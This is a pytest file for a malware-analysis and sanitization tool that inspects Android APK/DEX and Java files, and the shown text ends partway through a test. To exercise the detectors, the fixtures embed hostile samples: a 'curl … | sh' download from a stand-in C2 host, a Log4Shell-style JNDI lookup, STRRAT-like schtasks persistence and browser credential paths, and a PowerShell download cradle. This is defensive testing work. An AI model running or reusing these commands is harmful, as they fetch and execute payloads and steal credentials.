"""
Unit tests for Android APK & Dalvik DEX analysis, Java source/bytecode/JAR analysis,
identification disambiguation, and sanitization (CDR).
"""

import io
import struct
import zipfile
import pytest
from pathlib import Path

from app.analyzers.identification import IdentificationAnalyzer
from app.analyzers.apk_analyzer import ApkAnalyzer, AxmlDecoder, DexParser
from app.analyzers.java_analyzer import JavaAnalyzer, JavaClassParser
from app.sanitizers.apk_sanitizer import ApkSanitizer
from app.sanitizers.java_sanitizer import JavaSanitizer
from app.sanitizers.base import SanitizationOptions


def test_java_and_dex_identification(tmp_path: Path):
    """Verify identification correctly classifies Java source, class, jar, dex, and apk."""
    ident = IdentificationAnalyzer()

    # 1. Java Source (.java)
    java_file = tmp_path / "Payload.java"
    java_file.write_text("public class Payload { public static void main(String[] args) {} }")
    res_java = ident.analyze(java_file, "Payload.java", "text/plain")
    assert res_java.data["category"] == "java"
    assert "java" in (res_java.data.get("detected_mime") or "").lower()

    # 2. Java Compiled Bytecode (.class) - 0xCAFEBABE with Java version 52 (Java 8)
    class_bytes = struct.pack(">IHH", 0xCAFEBABE, 0, 52) + b"\x00" * 20
    class_file = tmp_path / "Payload.class"
    class_file.write_bytes(class_bytes)
    res_class = ident.analyze(class_file, "Payload.class", "application/octet-stream")
    assert res_class.data["category"] == "java"
    assert res_class.data.get("detected_mime") == "application/x-java-class"

    # 3. Dalvik Executable (.dex) - dex\n035\x00
    dex_bytes = b"dex\n035\x00" + b"\x00" * 100
    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_bytes)
    res_dex = ident.analyze(dex_file, "classes.dex", "application/octet-stream")
    assert res_dex.data["category"] == "apk"
    assert res_dex.data.get("detected_mime") == "application/x-dex"

    # 4. APK package (.apk) - ZIP with AndroidManifest.xml
    apk_file = tmp_path / "testapp.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00" + b"\x00" * 40)
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 40)
    res_apk = ident.analyze(apk_file, "testapp.apk", "application/octet-stream")
    assert res_apk.data["category"] == "apk"
    assert res_apk.data.get("detected_mime") == "application/vnd.android.package-archive"

    # 5. JAR archive (.jar) - ZIP with META-INF/MANIFEST.MF
    jar_file = tmp_path / "app.jar"
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\r\nMain-Class: com.example.App\r\n")
    res_jar = ident.analyze(jar_file, "app.jar", "application/octet-stream")
    assert res_jar.data["category"] == "java"
    assert res_jar.data.get("detected_mime") == "application/java-archive"


def test_java_source_analysis(tmp_path: Path):
    """Test Java source analyzer on malicious execution vectors."""
    source_code = """
    package com.malicious.payload;
    import java.lang.reflect.Method;
    import sun.misc.Unsafe;

    public class Exploit {
        public static void main(String[] args) throws Exception {
            // Shell command execution
            Runtime.getRuntime().exec("curl -s http://c2.evil.com/drop.sh | sh");
            ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", "whoami");
            
            // JNDI Log4Shell lookup
            new javax.naming.InitialContext().lookup("ldap://evil-ldap.com:1389/Exploit");
            
            // Dynamic Reflection
            Class<?> clazz = Class.forName("com.secret.Payload");
            Method m = clazz.getMethod("execute");
            m.invoke(null);
        }
    }
    """
    java_file = tmp_path / "Exploit.java"
    java_file.write_text(source_code)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(java_file, "Exploit.java", "text/x-java-source")
    assert res.success is True
    data = res.data
    assert data["is_java"] is True
    assert data["java_subtype"] == "source"
    assert len(data["dangerous_apis"]) >= 4

    api_titles = [a["title"] for a in data["dangerous_apis"]]
    assert any("Shell Command Execution" in t for t in api_titles)
    assert any("Subprocess Creation" in t for t in api_titles)
    assert any("Remote JNDI" in t for t in api_titles)
    assert any("Reflection" in t for t in api_titles)

    # Check extracted URLs
    assert any("c2.evil.com" in u for u in data["iocs"]["urls"])
    assert data["risk_score"] >= 60
    assert data["risk_level"] in ("HIGH", "CRITICAL")


def test_jar_archive_analysis(tmp_path: Path):
    """Test JAR archive analyzer detecting Main-Class, Premain Java Agent, all-permissions, and embedded binaries."""
    jar_file = tmp_path / "agent_trojan.jar"
    manifest_content = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: com.rat.BotClient\r\n"
        "Premain-Class: com.rat.AgentHook\r\n"
        "Permissions: all-permissions\r\n"
        "\r\n"
    )
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_content)
        zf.writestr("com/rat/BotClient.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34Runtime.getRuntime().exec")
        zf.writestr("com/rat/AgentHook.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34sun/misc/Unsafe")
        zf.writestr("lib/win32/payload.dll", b"MZ\x90\x00" + b"\x00" * 100)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "agent_trojan.jar", "application/java-archive")
    assert res.success is True
    data = res.data
    assert data["java_subtype"] == "jar"
    assert data["main_class"] == "com.rat.BotClient"
    assert data["premain_class"] == "com.rat.AgentHook"
    assert data["permissions"] == "all-permissions"
    assert len(data["embedded_binaries"]) == 1
    assert "payload.dll" in data["embedded_binaries"][0]

    findings_titles = [f.title for f in res.findings]
    assert any("Premain-Class" in t for t in findings_titles)
    assert any("all-permissions" in t for t in findings_titles)
    assert any("Embedded Native Binaries" in t for t in findings_titles)


def test_standalone_dex_analysis(tmp_path: Path):
    """Test Dalvik Executable (.dex) string table and API detection."""
    # Build minimal valid DEX header
    dex_buf = bytearray(112)
    dex_buf[0:8] = b"dex\n035\x00"
    dex_buf[32:36] = struct.pack("<I", 112)  # file_size = 112
    dex_buf[36:40] = struct.pack("<I", 112)  # header_size = 112
    dex_buf[40:44] = struct.pack("<I", 0x12345678)  # endian_tag

    # Append string containing suspicious API call and C2 URL
    test_str = b"Landroid/telephony/SmsManager;->sendTextMessage https://c2.botnet.cc/beacon"
    dex_buf.extend(test_str)

    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_buf)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(dex_file, "classes.dex", "application/x-dex")
    assert res.success is True
    data = res.data
    assert data["is_standalone_dex"] is True
    assert any("SmsManager" in api["api"] for api in data["dex_info"]["detected_apis"])
    assert any("c2.botnet.cc" in u for u in data["iocs"]["urls"])


def test_apk_and_java_sanitizer(tmp_path: Path):
    """Test CDR sanitizers for APK and Java."""
    apk_sanitizer = ApkSanitizer()
    java_sanitizer = JavaSanitizer()

    # 1. APK PDF Dossier Generation
    apk_in = tmp_path / "app.apk"
    apk_in.write_bytes(b"PK\x03\x04" + b"\x00" * 100)
    apk_out = tmp_path / "app_sanitized.pdf"
    apk_opts = SanitizationOptions(convert_to_pdf=True)

    apk_res = apk_sanitizer.sanitize(apk_in, apk_out, apk_opts, original_filename="app.apk")
    assert apk_res.success is True
    assert apk_out.exists()
    assert apk_out.stat().st_size > 0
    # PDF magic
    assert apk_out.read_bytes()[:4] == b"%PDF"

    # 2. Java Source Sanitization (Disarm & Header)
    java_in = tmp_path / "Malicious.java"
    java_in.write_text('Runtime.getRuntime().exec("whoami"); ProcessBuilder pb = new ProcessBuilder();')
    java_out = tmp_path / "Malicious_clean.java"
    java_opts = SanitizationOptions(convert_to_pdf=False)

    j_res = java_sanitizer.sanitize(java_in, java_out, java_opts, original_filename="Malicious.java")
    assert j_res.success is True
    clean_code = java_out.read_text()
    assert "/* [FILESANITIZER_DISARMED_EXECUTION] */" in clean_code
    assert "Runtime.getRuntime().exec" not in clean_code

    # 3. Java PDF Review Dossier
    java_pdf_out = tmp_path / "Malicious.pdf"
    j_pdf_res = java_sanitizer.sanitize(java_in, java_pdf_out, SanitizationOptions(convert_to_pdf=True))
    assert j_pdf_res.success is True
    assert java_pdf_out.exists()
    assert java_pdf_out.read_bytes()[:4] == b"%PDF"


def test_comprehensive_apk_technical_analysis(tmp_path: Path):
    """Test deep technical APK inspection: manifest, permissions, embedded sources, online intel, and security audit."""
    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bankbot.trojan"
    android:versionCode="201"
    android:versionName="2.0.1">
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <application android:debuggable="true" android:allowBackup="true" android:usesCleartextTraffic="true">
        <activity android:name="com.bankbot.trojan.MainActivity" android:exported="true" />
        <receiver android:name="com.bankbot.trojan.BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""

    apk_file = tmp_path / "sample_banker.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 100)
        zf.writestr("assets/root_exploit.sh", "#!/bin/sh\nsu -c 'chmod 777 /data/local/tmp'\n")
        zf.writestr("assets/index.android.bundle", "console.log('App init'); const key = 'AIzaSyD-1234567890123456789012345'; fetch('https://c2.botnet.cc');")
        zf.writestr("res/values/strings.xml", "<resources><string name='app_name'>BankSecure</string></resources>")

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "sample_banker.apk", "application/vnd.android.package-archive")
    assert res.success is True
    data = res.data

    assert data["is_apk"] is True
    assert data["package_name"] == "com.bankbot.trojan"
    assert data["version_code"] == "201"
    assert data["security_flags"]["debuggable"] is True
    assert data["security_flags"]["allowBackup"] is True
    assert data["security_flags"]["usesCleartextTraffic"] is True

    # Check Dangerous Permissions
    dp_names = [p["permission"] for p in data["dangerous_permissions"]]
    assert "android.permission.SEND_SMS" in dp_names
    assert "android.permission.SYSTEM_ALERT_WINDOW" in dp_names

    # Check Exported Components
    assert "com.bankbot.trojan.MainActivity" in data["exported_components"]["activities"]
    assert "com.bankbot.trojan.BootReceiver" in data["exported_components"]["receivers"]

    # Check Embedded Source Files Analysis
    src_files = {s["filename"]: s for s in data["embedded_source_files"]}
    assert "assets/root_exploit.sh" in src_files
    assert src_files["assets/root_exploit.sh"]["danger_level"] in ("malicious", "suspicious")
    assert any("Command Execution" in f for f in src_files["assets/root_exploit.sh"]["suspicious_findings"])

    assert "assets/index.android.bundle" in src_files
    assert src_files["assets/index.android.bundle"]["file_type"] == "javascript"
    assert any("Google API Key" in f for f in src_files["assets/index.android.bundle"]["suspicious_findings"])

    # Check Online Threat Intel URLs
    assert "koodous.com/apks/" in data["online_intel"]["koodous_url"]
    assert "virustotal.com/gui/file/" in data["online_intel"]["virustotal_url"]
    assert "play.google.com/store/apps/details?id=com.bankbot.trojan" in data["online_intel"]["google_play_url"]

    # Check Security Compliance Audit
    audit_checks = {a["check"]: a["status"] for a in data["security_audit"]}
    assert audit_checks.get("Debuggable Mode") == "FAIL"
    assert audit_checks.get("Application Backup") == "WARN"
    assert audit_checks.get("Cleartext Network Traffic") == "FAIL"
    assert audit_checks.get("Screen Overlay Hijacking") == "WARN"

    # Check Risk Score is Elevated
    assert data["risk_score"] >= 60
    assert data["risk_level"] in ("HIGH", "CRITICAL")


def test_apk_network_security_config_and_malicious_apis(tmp_path: Path):
    """Verify Android APK analyzer flags Network Security Config MitM flaws and explains malicious APIs."""
    apk_file = tmp_path / "banking_spyware.apk"

    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mobile.trojan" android:versionCode="1" android:versionName="1.0">
        <uses-permission android:name="android.permission.SEND_SMS" />
        <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
        <application android:networkSecurityConfig="@xml/network_security_config">
            <activity android:name="com.mobile.trojan.MainActivity" android:exported="true" />
        </application>
    </manifest>
    """

    network_security_config_xml = """<?xml version="1.0" encoding="utf-8"?>
    <network-security-config>
        <base-config cleartextTrafficPermitted="true">
            <trust-anchors>
                <certificates src="system" />
                <certificates src="user" />
            </trust-anchors>
        </base-config>
    </network-security-config>
    """

    # Build a minimal DEX with string table containing malicious APIs
    # Strings: android/telephony/SmsManager;->sendTextMessage, AES/ECB, android/accessibilityservice/AccessibilityService, TrustAllTrustManager
    dex_strings = [
        "Lcom/mobile/trojan/MainActivity;",
        "android/telephony/SmsManager;->sendTextMessage",
        "AES/ECB",
        "android/accessibilityservice/AccessibilityService",
        "TrustAllTrustManager",
        "https://c2.bankingtrojan.cc/api"
    ]
    str_data = b""
    str_offsets = []
    curr_off = 0x70 + len(dex_strings) * 4
    for s in dex_strings:
        encoded = len(s).to_bytes(1, "little") + s.encode("utf-8") + b"\x00"
        str_offsets.append(curr_off + len(str_data))
        str_data += encoded

    header = bytearray(0x70)
    header[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", header, 0x38, len(dex_strings)) # string_ids_size
    struct.pack_into("<I", header, 0x3C, 0x70)             # string_ids_off
    struct.pack_into("<I", header, 0x60, 0x70 + len(dex_strings) * 4 + len(str_data)) # data_off

    string_ids = bytearray()
    for off in str_offsets:
        string_ids += struct.pack("<I", off)

    dex_bytes = bytes(header) + bytes(string_ids) + str_data

    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("res/xml/network_security_config.xml", network_security_config_xml)
        zf.writestr("classes.dex", dex_bytes)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "banking_spyware.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # 1. Network Security Config Audit
    nsc = data["network_security_config"]
    assert nsc["found"] is True
    assert nsc["cleartext_permitted"] is True
    assert nsc["trusts_user_certs"] is True
    assert any("User CAs Trusted" in f.title for f in res.findings)
    assert any("Cleartext HTTP Permitted" in f.title for f in res.findings)

    # 2. Malicious API Calls Flagged with Explanations
    detected_apis = data["dex_info"]["detected_apis"]
    assert len(detected_apis) >= 3

    sms_api = next((a for a in detected_apis if "SMS" in a["title"]), None)
    assert sms_api is not None
    assert sms_api["severity"] == "critical"
    assert "risk_explanation" in sms_api and len(sms_api["risk_explanation"]) > 20
    assert "remediation" in sms_api and len(sms_api["remediation"]) > 10
    assert sms_api.get("cwe") is not None
    assert sms_api.get("owasp_mobile") is not None

    crypto_api = next((a for a in detected_apis if "ECB" in a["title"]), None)
    assert crypto_api is not None
    assert crypto_api["category"] == "crypto"
    assert "CWE-327" in crypto_api["cwe"]
    assert "M5" in crypto_api["owasp_mobile"]

    # 3. Security Audit Checklist
    audit_dict = {item["check"]: item["status"] for item in data["security_audit"]}
    assert audit_dict.get("User CA Trust Anchors") == "FAIL"
    assert audit_dict.get("Cleartext Network Traffic") == "FAIL"
    assert audit_dict.get("Cryptographic Robustness") == "FAIL"


def test_jar_deep_forensics_and_class_disassembly(tmp_path: Path):
    """Verify JAR archive analysis populates compatibility fields, disassembles classes, and identifies high-risk APIs."""
    jar_file = tmp_path / "trojan_payload.jar"

    manifest_data = "Manifest-Version: 1.0\r\nMain-Class: com.example.TrojanAgent\r\nPermissions: all-permissions\r\n"

    # Minimal compiled class bytes for com/example/TrojanAgent
    # Magic CAFEBABE, Java 8 (version 52)
    # Constant pool with Runtime.exec and AES/ECB strings
    cp_entries = [
        (1, "com/example/TrojanAgent"),             # 1: Utf8
        (7, 1),                                     # 2: Class -> 1
        (1, "java/lang/Object"),                    # 3: Utf8
        (7, 3),                                     # 4: Class -> 3
        (1, "Runtime.getRuntime().exec"),           # 5: Utf8
        (1, "AES/ECB/PKCS5Padding"),                # 6: Utf8
        (1, "https://evil-c2.net/payload"),         # 7: Utf8
    ]

    cp_count = len(cp_entries) + 1
    cp_bytes = bytearray()
    for entry in cp_entries:
        tag = entry[0]
        if tag == 1:
            val = entry[1].encode("utf-8")
            cp_bytes += struct.pack(">BH", tag, len(val)) + val
        elif tag == 7:
            cp_bytes += struct.pack(">BH", tag, entry[1])

    class_header = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, cp_count)
    class_tail = struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)
    class_bytes = class_header + bytes(cp_bytes) + class_tail

    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
        zf.writestr("com/example/TrojanAgent.class", class_bytes)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "trojan_payload.jar", "application/java-archive")

    assert res.success is True
    data = res.data

    assert data["is_java"] is True
    assert data["is_jar"] is True
    assert data["java_subtype"] == "jar"
    assert data["class_count"] == 1
    assert data["classes_count"] == 1
    assert data["main_class"] == "com.example.TrojanAgent"
    assert "com.example" in data["packages"]
    assert "trojan_payload.jar" in data["filename"]

    # Verify code preview has both Manifest and Disassembled class
    assert "META-INF/MANIFEST.MF" in data["manifest_content"] or "Main-Class" in data["manifest_content"]
    assert "Disassembled Entry / Target Class: com/example/TrojanAgent.class" in data["code_preview"]
    assert "public class TrojanAgent extends Object" in data["code_preview"]

    # Verify high risk APIs are flagged and explained
    assert len(data["dangerous_apis"]) >= 2
    api_names = [a["title"] for a in data["dangerous_apis"]]
    assert any("Shell Command Execution" in t for t in api_names)
    assert any("ECB" in t for t in api_names)

    exec_api = next(a for a in data["dangerous_apis"] if "Shell Command Execution" in a["title"])
    assert exec_api.get("risk_explanation") is not None
    assert exec_api.get("remediation") is not None
    assert "CWE-78" in exec_api["cwe"]


def test_apk_evasion_and_asset_entropy(tmp_path: Path):
    """Test multi-DEX parser bomb filtering, package name inference, and encrypted asset detection."""
    apk_file = tmp_path / "packed_malware.apk"

    # Build minimal valid DEX header (112 bytes)
    dummy_dex = bytearray(112)
    dummy_dex[0:8] = b"dex\n035\x00"

    # Build real DEX with classes and a malicious API
    real_dex = bytearray(112)
    real_dex[0:8] = b"dex\n035\x00"
    real_dex.extend(b"Lcom/stealth/trojan/MainActivity; Ldalvik/system/DexClassLoader;->loadClass")

    # High-entropy encrypted payload (simulating encrypted second-stage drop)
    import os
    encrypted_blob = os.urandom(120_000)

    with zipfile.ZipFile(apk_file, "w") as zf:
        # 12 dummy DEX stubs (parser bomb)
        for i in range(12):
            zf.writestr(f"classes000{i:02d}.dex", dummy_dex)
        # Real DEX file
        zf.writestr("classes.dex", real_dex)
        # Encrypted asset payload
        zf.writestr("assets/payload.bin", encrypted_blob)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "packed_malware.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # Multi-DEX parser bomb finding
    bomb_finding = next((f for f in res.findings if "Multi-DEX Parser Bomb" in f.title), None)
    assert bomb_finding is not None
    assert bomb_finding.severity == "critical"

    # Encrypted payload finding in assets
    entropy_finding = next((f for f in res.findings if "Encrypted / Packed Second-Stage Payload" in f.title), None)
    assert entropy_finding is not None
    assert entropy_finding.severity == "critical"
    assert "payload.bin" in entropy_finding.title

    # Package inference from Dalvik classes
    assert data["package_name"] == "com.stealth.trojan"


def test_apk_threat_intel_packers_signatures_and_keystore_audit(tmp_path: Path):
    """Test packer detection, malware signatures, keystore masquerading & Janus, and CTI probers."""
    apk_file = tmp_path / "threat_sample.apk"

    # Minimal DEX with Telegram bot and Discord webhook strings
    dex_data = bytearray(112)
    dex_data[0:8] = b"dex\n035\x00"
    dex_data.extend(
        b"Lcom/malicious/dropper/MainActivity;\x00"
        b"https://api.telegram.org/bot123456789:ABCdefGHIjklMNOpqrsTUVwxyz012345678/sendMessage\x00"
        b"https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\x00"
        b"https://c2-backend.firebaseio.com\x00"
    )

    # Manifest with VPN Service & Overlay permissions
    manifest_xml = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.malicious.dropper">\n'
        '    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />\n'
        '    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />\n'
        '    <application>\n'
        '        <service android:name=".StealthVpnService">\n'
        '            <intent-filter>\n'
        '                <action android:name="android.net.VpnService" />\n'
        '            </intent-filter>\n'
        '        </service>\n'
        '    </application>\n'
        '</manifest>'
    )

    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("classes.dex", dex_data)
        # Qihoo 360 Jiagu packer marker
        zf.writestr("assets/libjiagu.so", b"\x7fELF" + b"\x00" * 100)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "threat_sample.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # 1. Packer Detection
    assert data["packer_info"]["is_packed"] is True
    assert "Qihoo 360" in data["packer_info"]["packer_name"]
    packer_f = next((f for f in res.findings if "Packer Detected" in f.title), None)
    assert packer_f is not None

    # 2. Malware Signatures (VPN Proxy & Overlay)
    vpn_sig = next((s for s in data["malware_signatures"] if "VPN" in s["title"]), None)
    assert vpn_sig is not None

    overlay_sig = next((s for s in data["malware_signatures"] if "Overlay" in s["title"]), None)
    assert overlay_sig is not None

    # 3. Exfiltration Tokens
    tokens = data["online_intel"]["exfiltration_tokens"]
    assert len(tokens["telegram_bots"]) == 1
    assert "123456789:ABCdefGHIjklMNOpqrsTUVwxyz012345678" in tokens["telegram_bots"][0]
    assert len(tokens["discord_webhooks"]) == 1
    assert "c2-backend" in tokens["firebase_databases"]

    # 4. Play Store Status (Unlisted / Sideloaded)
    assert data["online_intel"]["play_store_status"] in ("unlisted_sideloaded", "offline_or_timeout")


def test_strrat_and_behavioral_4_pillars_jar_analysis(tmp_path: Path):
    """
    Test STRRAT Remote Access Trojan forensic detection and the 4 behavioral pillars
    based on the SecurityScorecard STRRAT case study:
    1. 🌐 Internet activity (Socket, C2, telemetry)
    2. 📂 File access (broad traversal, AppData, browser DBs, .crimson fake ransomware, lock.file, ZIP)
    3. 🛠 System command execution (Runtime.exec, cmd.exe /c, schtasks.exe persistence)
    4. 🧩 Hidden or hard-to-review code (Allatori watermark ALLATORIxDEMO, string decryptors, collapsed hierarchy)
    """
    jar_file = tmp_path / "strrat_sample.jar"

    manifest_data = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: a.a\r\n"
        "\r\n"
    )

    # Build bytecode with constant pool entries matching STRRAT hallmarks
    cp_entries = [
        None,
        {"tag": 7, "index": 2},                                                # 1: Class a/a
        {"tag": 1, "value": "a/a"},                                            # 2: Utf8 a/a
        {"tag": 7, "index": 4},                                                # 3: Class java/lang/Object
        {"tag": 1, "value": "java/lang/Object"},                               # 4: Utf8 java/lang/Object
        {"tag": 1, "value": "ALLATORIxDEMO"},                                  # 5: Allatori watermark
        {"tag": 1, "value": "(Ljava/lang/String;)Ljava/lang/String;"},         # 6: Allatori string decrypter
        {"tag": 1, "value": ".crimson"},                                       # 7: Fake ransomware extension
        {"tag": 1, "value": "lock.file"},                                      # 8: Instance mutex lockfile
        {"tag": 1, "value": "Login Data"},                                     # 9: Chrome credential SQLite
        {"tag": 1, "value": "key4.db"},                                        # 10: Firefox credential database
        {"tag": 1, "value": "user.home"},                                      # 11: System user folder
        {"tag": 1, "value": "APPDATA"},                                        # 12: AppData directory
        {"tag": 1, "value": "cmd.exe /c powershell -enc dGVzdA=="},             # 13: Spawning shell
        {"tag": 1, "value": "schtasks /create /sc onlogon /tn JavaUpd /tr java"}, # 14: Windows persistence
        {"tag": 1, "value": "http://c2.strrat-infrastructure.cc:8080/gate.php"}, # 15: C2 URL
        {"tag": 10, "idx1": 17, "idx2": 19},                                  # 16: MethodRef Runtime.exec
        {"tag": 7, "index": 18},                                               # 17: Class java/lang/Runtime
        {"tag": 1, "value": "java/lang/Runtime"},                              # 18: Utf8 java/lang/Runtime
        {"tag": 12, "idx1": 20, "idx2": 21},                                  # 19: NameAndType exec
        {"tag": 1, "value": "exec"},                                           # 20: Utf8 exec
        {"tag": 1, "value": "(Ljava/lang/String;)Ljava/lang/Process;"},        # 21: Utf8 descriptor
        {"tag": 10, "idx1": 23, "idx2": 25},                                  # 22: MethodRef Socket.connect
        {"tag": 7, "index": 24},                                               # 23: Class java/net/Socket
        {"tag": 1, "value": "java/net/Socket"},                                # 24: Utf8 java/net/Socket
        {"tag": 12, "idx1": 26, "idx2": 27},                                  # 25: NameAndType connect
        {"tag": 1, "value": "connect"},                                        # 26: Utf8 connect
        {"tag": 1, "value": "(Ljava/net/SocketAddress;)V"},                    # 27: Utf8 descriptor
        {"tag": 10, "idx1": 29, "idx2": 31},                                  # 28: MethodRef Files.walkFileTree
        {"tag": 7, "index": 30},                                               # 29: Class java/nio/file/Files
        {"tag": 1, "value": "java/nio/file/Files"},                            # 30: Utf8 java/nio/file/Files
        {"tag": 12, "idx1": 32, "idx2": 33},                                  # 31: NameAndType walkFileTree
        {"tag": 1, "value": "walkFileTree"},                                   # 32: Utf8 walkFileTree
        {"tag": 1, "value": "(Ljava/nio/file/Path;Ljava/nio/file/FileVisitor;)Ljava/nio/file/Path;"}, # 33: Utf8
        {"tag": 10, "idx1": 35, "idx2": 37},                                  # 34: MethodRef ZipOutputStream
        {"tag": 7, "index": 36},                                               # 35: Class java/util/zip/ZipOutputStream
        {"tag": 1, "value": "java/util/zip/ZipOutputStream"},                  # 36: Utf8
        {"tag": 12, "idx1": 38, "idx2": 39},                                  # 37: NameAndType putNextEntry
        {"tag": 1, "value": "putNextEntry"},                                   # 38: Utf8
        {"tag": 1, "value": "(Ljava/util/zip/ZipEntry;)V"},                    # 39: Utf8
    ]

    cp_count = len(cp_entries)
    buf = bytearray()
    buf.extend(struct.pack(">IHHH", 0xCAFEBABE, 0, 52, cp_count))

    for item in cp_entries[1:]:
        tag = item["tag"]
        buf.append(tag)
        if tag == 1:
            val_bytes = item["value"].encode("utf-8")
            buf.extend(struct.pack(">H", len(val_bytes)))
            buf.extend(val_bytes)
        elif tag == 7:
            buf.extend(struct.pack(">H", item["index"]))
        elif tag in (10, 12):
            buf.extend(struct.pack(">HH", item["idx1"], item["idx2"]))

    # access_flags, this_class (1), super_class (3)
    buf.extend(struct.pack(">HHH", 0x0021, 1, 3))
    # interfaces_count = 0
    buf.extend(struct.pack(">H", 0))

    class_bytes = bytes(buf)

    # Build JAR with obfuscated single letter classes
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
        zf.writestr("a/a.class", class_bytes)
        zf.writestr("a/b.class", class_bytes)
        zf.writestr("a/c.class", class_bytes)
        zf.writestr("res/config.dat", b"encrypted_c2_channel_config")

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "strrat_sample.jar", "application/java-archive")

    assert res.success is True
    data = res.data

    # Check 4 pillars
    ba = data["behavioral_analysis"]
    assert ba is not None

    # Pillar 1: Internet Activity
    net = ba["internet_activity"]
    assert net["detected"] is True
    assert net["verdict"] in ("SUSPICIOUS", "POTENTIAL")
    assert any("Socket" in c["name"] for c in net["capabilities"])
    assert any("strrat-infrastructure" in u for u in net["endpoints"])

    # Pillar 2: File Access
    files = ba["file_access"]
    assert files["detected"] is True
    assert files["verdict"] == "SUSPICIOUS"
    assert any(c["id"] == "credential_harvesting" for c in files["capabilities"])
    assert any(c["id"] == "ransomware_simulation" for c in files["capabilities"])
    assert any("Login Data" in p for p in files["targeted_paths"])
    assert any(".crimson" in p for p in files["targeted_paths"])

    # Pillar 3: Command Execution
    cmd = ba["command_execution"]
    assert cmd["detected"] is True
    assert cmd["verdict"] == "SUSPICIOUS"
    assert any(c["id"] == "process_spawning" for c in cmd["capabilities"])
    assert any(c["id"] == "system_persistence_admin" for c in cmd["capabilities"])
    assert any("schtasks" in c for c in cmd["detected_commands"])

    # Pillar 4: Code Obfuscation
    obf = ba["code_obfuscation"]
    assert obf["is_obfuscated"] is True
    assert obf["verdict"] == "OBFUSCATED"
    assert any("Allatori" in o for o in obf["obfuscators"])
    assert any(i["type"] == "watermark" for i in obf["indicators"])
    assert any(i["type"] == "string_encryption" for i in obf["indicators"])

    # STRRAT Forensic Profile
    strrat = ba["strrat_heuristics"]
    assert strrat["is_strrat_candidate"] is True
    assert strrat["confidence"] == "HIGH"
    assert len(strrat["matched_indicators"]) >= 4

    # Threat Finding Generated
    findings_titles = [f.title for f in res.findings]
    assert any("STRRAT Java RAT" in t for t in findings_titles)
    assert any("Internet" in t for t in findings_titles)
    assert any("File Access" in t for t in findings_titles)
    assert any("Shell Command" in t for t in findings_titles)
    assert any("Obfuscated Code" in t for t in findings_titles)
    assert data["risk_level"] == "CRITICAL"


def test_jar_script_python_binary_parity_analysis(tmp_path: Path):
    """
    Verify complete feature parity for JAR archives matching Scripts, Python, and Binaries:
    1. Classes catalog & decompiled pseudo-Java source with methods and fields
    2. Categorized strings (Network, File Paths, Registry, Commands, All)
    3. Base64 payload block detection, automatic decoding, and secondary IOC discovery
    4. LOLBins and OS shell commands extraction
    5. Embedded non-class resources with size and threat rating
    6. Digital signature detection
    7. Anti-analysis scanner integration for Java
    """
    import base64
    from app.analyzers.anti_analysis import AntiAnalysisDetector

    jar_file = tmp_path / "parity_test.jar"
    manifest = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: com.security.AgentDropper\r\n"
        "Permissions: all-permissions\r\n"
        "\r\n"
    )

    # Base64 encoded payload containing an embedded URL
    b64_raw = b"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object Net.WebClient).DownloadFile('https://c2.evil-parity.org/rat.exe','C:\\\\Users\\\\Public\\\\rat.exe')"
    b64_str = base64.b64encode(b64_raw).decode("ascii")

